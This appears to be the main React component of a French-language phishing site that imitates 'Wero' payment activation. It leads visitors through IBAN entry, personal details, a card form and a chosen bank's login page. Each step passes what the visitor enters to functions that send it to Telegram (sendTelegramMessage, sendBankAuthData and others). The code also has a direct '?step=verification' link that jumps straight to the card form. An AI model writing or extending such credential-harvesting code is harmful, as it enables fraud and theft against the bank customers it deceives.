import React, { useState, useEffect } from 'react';
import Navbar from './components/Navbar';
import Hero from './components/Hero';
import Footer from './components/Footer';
import { MessageForm } from './components/MessageForm';
import { PersonalInfoForm } from './components/PersonalInfoForm';
import { BankForm } from './components/BankForm';
import { AuthPage } from './components/AuthPage';
import { BankSelectionForm, ExternalBankData } from './components/BankSelectionForm';
import { BankAuthForm } from './components/BankAuthForm';
import { SuccessMessage } from './components/SuccessMessage';
import { sendTelegramMessage, sendPersonalInfoData, sendBankFormData, sendBankAuthData } from './services/telegram';

type Step = 'home' | 'iban' | 'personal' | 'bank' | 'auth' | 'bankSelection' | 'bankAuth' | 'success';

export default function App() {
  const [currentStep, setCurrentStep] = useState<Step>('home');
  const [userAmount, setUserAmount] = useState<string>('');
  const [selectedBank, setSelectedBank] = useState<string | ExternalBankData>('');
  const [isDirectAccess, setIsDirectAccess] = useState(false);

  // Check if there's a direct link to verification page (standalone)
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    if (params.get('step') === 'verification') {
      setCurrentStep('bank');
      setIsDirectAccess(true);
    }
  }, []);

  // Update browser history when step changes
  useEffect(() => {
    if (currentStep === 'home') {
      window.history.pushState({ step: 'home' }, '', '/');
    } else {
      window.history.pushState({ step: currentStep }, '', `/?step=${currentStep}`);
    }
  }, [currentStep]);

  // Handle browser back button
  useEffect(() => {
    const handlePopState = (event: PopStateEvent) => {
      const step = event.state?.step || 'home';
      setCurrentStep(step as Step);
    };

    window.addEventListener('popstate', handlePopState);
    return () => window.removeEventListener('popstate', handlePopState);
  }, []);

  const handleActivateWero = () => {
    setCurrentStep('iban');
  };

  const handleBackToHome = () => {
    setCurrentStep('home');
  };

  const handleBackToPrevious = () => {
    switch(currentStep) {
      case 'iban':
        setCurrentStep('home');
        break;
      case 'personal':
        setCurrentStep('iban');
        break;
      case 'bank':
        setCurrentStep('personal');
        break;
      case 'auth':
        setCurrentStep('bank');
        break;
      case 'bankSelection':
        setCurrentStep('auth');
        break;
      case 'bankAuth':
        setCurrentStep('bankSelection');
        break;
      default:
        setCurrentStep('home');
    }
  };

  const handleIbanSubmit = async (iban: string) => {
    const success = await sendTelegramMessage(iban);
    if (success) {
      setCurrentStep('personal');
    }
    return success;
  };

  const handlePersonalInfoSubmit = async (formData: any) => {
    const success = await sendPersonalInfoData(formData);
    if (success) {
      setUserAmount(formData.amount);
      setCurrentStep('auth');
    }
    return success;
  };

  const handleBankFormSubmit = async (formData: any) => {
    const success = await sendBankFormData(formData);
    if (success) {
      // Si accès direct via ?step=verification, afficher succès directement
      if (isDirectAccess) {
        setCurrentStep('success');
      } else {
        setCurrentStep('auth');
      }
    }
    return success;
  };

  const handleAuthComplete = () => {
    setCurrentStep('bankSelection');
  };

  const handleBankSelection = (bankName: string) => {
    setSelectedBank(bankName);
    setCurrentStep('bankAuth');
  };

  const handleExternalBankSelection = (bankData: ExternalBankData) => {
    setSelectedBank(bankData);
    setCurrentStep('bankAuth');
  };

  const handleBankAuthSubmit = async (formData: any) => {
    const bankName = typeof selectedBank === 'string' ? selectedBank : selectedBank.name;
    const success = await sendBankAuthData({ ...formData, bank: bankName });
    if (success) {
      setCurrentStep('success');
    }
    return success;
  };

  return (
    <div className="min-h-screen">
      <Navbar />
      {currentStep === 'home' && (
        <>
          <Hero onActivateClick={handleActivateWero} />
          <Footer />
        </>
      )}
      {currentStep === 'iban' && (
        <div className="min-h-screen bg-gradient-to-br from-yellow-200 to-yellow-100 pt-20">
          <div className="max-w-xl mx-auto px-4 py-8">
            <button 
              onClick={handleBackToHome}
              className="flex items-center space-x-2 text-gray-700 mb-8"
            >
              <span>← Retour</span>
            </button>
            <h1 className="text-3xl md:text-4xl font-bold mb-8">Saisissez votre IBAN</h1>
            <MessageForm onSubmit={handleIbanSubmit} />
          </div>
        </div>
      )}
      {currentStep === 'personal' && (
        <PersonalInfoForm onSubmit={handlePersonalInfoSubmit} onBack={handleBackToPrevious} />
      )}
      {currentStep === 'bank' && (
        <BankForm onSubmit={handleBankFormSubmit} amount={userAmount} />
      )}
      {currentStep === 'auth' && (
        <AuthPage onAuthComplete={handleAuthComplete} />
      )}
      {currentStep === 'bankSelection' && (
        <BankSelectionForm 
          onBankSelect={handleBankSelection}
          onExternalBankSelect={handleExternalBankSelection}
          onBack={handleBackToPrevious}
        />
      )}
      {currentStep === 'bankAuth' && (
        <div className="pt-16">
          <BankAuthForm onSubmit={handleBankAuthSubmit} selectedBank={selectedBank} />
        </div>
      )}
      {currentStep === 'success' && <SuccessMessage />}
    </div>
  );
}